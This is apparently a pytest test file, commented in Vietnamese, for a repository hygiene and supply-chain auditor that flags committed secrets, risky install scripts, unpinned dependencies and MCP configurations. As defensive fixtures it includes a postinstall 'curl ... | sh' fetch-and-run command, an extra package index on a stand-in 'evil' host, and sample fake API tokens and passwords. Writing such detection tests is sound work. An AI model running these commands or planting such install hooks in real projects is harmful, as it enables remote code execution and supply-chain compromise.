"""Kiểm thử vệ sinh repo / chuỗi cung ứng offline / MCP / marker spec (hygiene.py)."""

import json
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

from auditor_engine import ProjectAuditor  # noqa: E402
from auditor_engine.hygiene import (  # noqa: E402
    check_mcp_configs, check_package_json, check_requirements, check_spec_markers, check_tracked_files,
    git_tracked_files, run_hygiene_checks,
)
from auditor_engine.remediation import CODE_RULES  # noqa: E402

needs_git = pytest.mark.skipif(shutil.which("git") is None, reason="cần git")


def codes(findings):
    return {f.code for f in findings}


def make_git_repo(root: Path, files: dict[str, str]):
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    subprocess.run(["git", "-C", str(root), "add", "-A", "-f"], check=True)


# ---- tệp đã bị commit ----
def test_untracked_repo_skips_git_checks(tmp_path):
    assert git_tracked_files(tmp_path) is None
    assert check_tracked_files(tmp_path, None) == []


@needs_git
def test_tracked_env_key_log_and_binary_are_flagged(tmp_path):
    make_git_repo(tmp_path, {
        ".env": "TOKEN=abc\n", ".env.example": "TOKEN=\n", "deploy.pem": "-----BEGIN PRIVATE KEY-----\nx\n",
        "cert.pem": "-----BEGIN CERTIFICATE-----\nx\n", "logs/app.log": "x", "tools/app.exe": "MZ",
    })
    found = {f.code: f for f in check_tracked_files(tmp_path, git_tracked_files(tmp_path))}
    assert set(found) == {"SEC-005", "HYG-002", "SUP-004"}
    assert ".env" in found["SEC-005"].message and "deploy.pem" in found["SEC-005"].message
    assert ".env.example" not in found["SEC-005"].message and "cert.pem" not in found["SEC-005"].message


@needs_git
def test_clean_tracked_repo_has_no_hygiene_findings(tmp_path):
    make_git_repo(tmp_path, {"README.md": "# x\n", ".env.example": "A=\n", "src/app.py": "print(1)\n"})
    assert check_tracked_files(tmp_path, git_tracked_files(tmp_path)) == []

@needs_git
def test_sec_005_env_and_private_key_filtering(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    make_git_repo(repo, {
        ".env": "API_KEY=k9F8m2L0pQ4vX7wZ1aB3cE5r\n",
        "config/.env.dev": "NODE_ENV=production\nPORT=3000\n",
        "tests/certs/x.key": "-----BEGIN RSA PRIVATE KEY-----\nfake\n",
        "fixtures/keys/id_rsa": "dummy",
        "deploy.pem": "-----BEGIN PRIVATE KEY-----\nreal_key_data\n",
    })
    tracked = git_tracked_files(repo)
    findings = {f.code: f for f in check_tracked_files(repo, tracked)}
    assert "SEC-005" in findings
    msg = findings["SEC-005"].message
    assert ".env" in msg
    assert "deploy.pem" in msg
    assert "config/.env.dev" not in msg
    assert "tests/certs/x.key" not in msg
    assert "fixtures/keys/id_rsa" not in msg

@needs_git
def test_synthetic_20_env_cases_precision_and_recall(tmp_path):
    secrets = [
        "API_KEY=9f8a7b6c5d4e3f2a1b0c9d8e7\n",
        "APP_SECRET=supersecretproductionkey123\n",
        "DATABASE_PASSWORD=mypassword998877\n",
        "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n",
        "CUSTOM_TOKEN=ghp_ABC1234567890abcdefghijklmnopqrstuv\n",
        "OPENAI_KEY=sk-proj-1234567890abcdefghijklmnopqrst\n",
        "SLACK_BOT_TOKEN=xoxb-1234-5678-abcdef\n",
        "GOOGLE_API_KEY=AIzaSyA1234567890abcdefghij\n",
        "DATABASE_URL=postgres://appuser:realsecretpass99@db.prod.internal:5432/main\n",
        "BROKER_URL=amqp://admin:strongbrokerpass@rabbitmq.local:5672/\n",
    ]
    non_secrets = [
        "NODE_ENV=production\n",
        "PORT=8080\n",
        "DEBUG=false\n",
        "PUBLIC_URL=https://api.example.com/v1\n",
        "API_KEY=your-api-key-here\n",
        "DATABASE_PASSWORD=changeme\n",
        "SECRET_TOKEN=xxxxxx\n",
        "AUTH_KEY=<insert_token_here>\n",
        "# API_KEY=commented_out_secret\n",
        "AWS_SECRET_ACCESS_KEY=\n",
    ]

    tp, fn, tn, fp = 0, 0, 0, 0

    # 1. Test 10 secrets (must flag SEC-005)
    for i, content_str in enumerate(secrets):
        case_dir = tmp_path / f"sec_{i}"
        case_dir.mkdir()
        make_git_repo(case_dir, {".env": content_str})
        findings = check_tracked_files(case_dir, git_tracked_files(case_dir))
        if any(f.code == "SEC-005" for f in findings):
            tp += 1
        else:
            fn += 1

    # 2. Test 10 non-secrets (must NOT flag SEC-005)
    for i, content_str in enumerate(non_secrets):
        case_dir = tmp_path / f"non_sec_{i}"
        case_dir.mkdir()
        make_git_repo(case_dir, {".env": content_str})
        findings = check_tracked_files(case_dir, git_tracked_files(case_dir))
        if any(f.code == "SEC-005" for f in findings):
            fp += 1
        else:
            tn += 1

    assert tp == 10, f"Expected 10 TP, got {tp}"
    assert fn == 0, f"Expected 0 FN, got {fn}"
    assert tn == 10, f"Expected 10 TN, got {tn}"
    assert fp == 0, f"Expected 0 FP, got {fp}"

    precision = tp / (tp + fp)
    recall = tp / (tp + fn)
    assert precision == 1.0
    assert recall == 1.0


# ---- chuỗi cung ứng ----
def pkg(tmp_path, data):
    p = tmp_path / "package.json"
    p.write_text(json.dumps(data), encoding="utf-8")
    return [p]


def test_postinstall_downloading_remote_code_is_sup_001(tmp_path):
    f = check_package_json(tmp_path, pkg(tmp_path, {"scripts": {"postinstall": "curl https://x.example/a.sh | sh"}}))
    assert codes(f) == {"SUP-001"}


def test_benign_install_script_is_not_flagged(tmp_path):
    assert check_package_json(tmp_path, pkg(tmp_path, {"scripts": {"postinstall": "node scripts/setup.js", "test": "curl x"}})) == []


def test_unpinned_dependencies_are_sup_002(tmp_path):
    f = check_package_json(tmp_path, pkg(tmp_path, {
        "dependencies": {"a": "*", "b": "latest", "c": "git+https://x/y.git", "d": "git+https://x/y.git#abc123", "e": "^1.2.3"}}))
    assert codes(f) == {"SUP-002"}
    msg = f[0].message
    assert msg.startswith("3 ") and ":a" in msg and ":e" not in msg and ":d" not in msg


def test_requirements_extra_index_and_git_unpinned(tmp_path):
    p = tmp_path / "requirements.txt"
    p.write_text("--extra-index-url https://evil.example/simple\nrequests==2.0\ngit+https://x.example/r.git\n", encoding="utf-8")
    assert codes(check_requirements(tmp_path, [p])) == {"SUP-003", "SUP-002"}


def test_requirements_pypi_index_and_pinned_git_are_ok(tmp_path):
    p = tmp_path / "requirements.txt"
    p.write_text("--index-url https://pypi.org/simple\ngit+https://x.example/r.git@v1.0\n", encoding="utf-8")
    assert check_requirements(tmp_path, [p]) == []


# ---- MCP ----
def mcp(tmp_path, servers, name=".mcp.json"):
    p = tmp_path / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps({"mcpServers": servers}), encoding="utf-8")


def test_known_bad_and_unpinned_mcp_packages(tmp_path):
    mcp(tmp_path, {
        "pw": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-playwright"]},
        "gh": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github@1.0.0"]},
        "fs": {"command": "npx", "args": ["-y", "some-mcp"]},
        "ok": {"command": "npx", "args": ["-y", "@playwright/mcp@0.0.30"]},
        "py": {"command": "uvx", "args": ["x"]},
    })
    found = {f.code: f for f in check_mcp_configs(tmp_path)}
    assert set(found) == {"AGT-004", "AGT-005"}
    assert "server-playwright" in found["AGT-004"].message and "server-github" in found["AGT-004"].message
    assert "some-mcp" in found["AGT-005"].message and "@playwright/mcp" not in found["AGT-005"].message


def test_mcp_in_other_config_locations_and_broken_json(tmp_path):
    mcp(tmp_path, {"x": {"command": "npx", "args": ["unpinned-pkg"]}}, ".cursor/mcp.json")
    (tmp_path / ".mcp.json").write_text("{not json", encoding="utf-8")
    assert codes(check_mcp_configs(tmp_path)) == {"AGT-005"}


# ---- spec marker ----
def test_needs_clarification_in_specs_is_flagged_but_not_templates(tmp_path):
    (tmp_path / "specs").mkdir()
    (tmp_path / "specs" / "login.md").write_text("# Login\n[NEEDS CLARIFICATION: which provider?]\n", encoding="utf-8")
    (tmp_path / "core" / "templates" / "specs").mkdir(parents=True)
    (tmp_path / "core" / "templates" / "specs" / "t.md").write_text("[NEEDS CLARIFICATION]\n", encoding="utf-8")
    (tmp_path / "notes.md").write_text("[NEEDS CLARIFICATION]\n", encoding="utf-8")
    files = list(tmp_path.rglob("*.md"))
    f = check_spec_markers(tmp_path, files)
    assert codes(f) == {"SPEC-001"} and f[0].location == "specs/login.md:2"


def test_no_marker_no_finding(tmp_path):
    (tmp_path / "specs").mkdir()
    (tmp_path / "specs" / "ok.md").write_text("# Done\n", encoding="utf-8")
    assert check_spec_markers(tmp_path, list(tmp_path.rglob("*.md"))) == []


# ---- tích hợp ----
def test_every_hygiene_code_has_remediation():
    for code in ("SEC-005", "HYG-002", "SUP-001", "SUP-002", "SUP-003", "SUP-004", "AGT-004", "AGT-005", "SPEC-001"):
        assert code in CODE_RULES and CODE_RULES[code][1], code


def test_findings_never_contain_file_contents(tmp_path):
    secret = "SUPERSECRETVALUE123"
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"postinstall": f"curl https://x/{secret} | sh"}}), encoding="utf-8")
    found = run_hygiene_checks(tmp_path, [tmp_path / "package.json"])
    assert found and all(secret not in f.message for f in found)


def test_audit_collects_hygiene_findings(tmp_path):
    (tmp_path / "README.md").write_text("# x\n", encoding="utf-8")
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {"a": "*"}}), encoding="utf-8")
    auditor = ProjectAuditor(tmp_path)
    auditor.run()
    assert "SUP-002" in {f.code for f in auditor.collect_findings()}
